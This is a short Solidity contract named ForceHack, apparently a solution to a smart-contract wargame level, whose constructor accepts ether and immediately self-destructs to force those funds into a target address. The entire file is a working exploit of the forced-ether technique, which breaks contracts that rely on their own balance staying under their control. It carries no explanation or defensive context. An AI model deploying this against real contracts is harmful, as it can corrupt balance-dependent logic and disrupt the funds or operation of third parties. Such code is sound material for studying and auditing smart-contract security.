// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceHack {
    constructor(address payable target) payable {
        require(msg.value > 0);
        // destroy this contract and send all funds to target
        selfdestruct(target);
    }
}
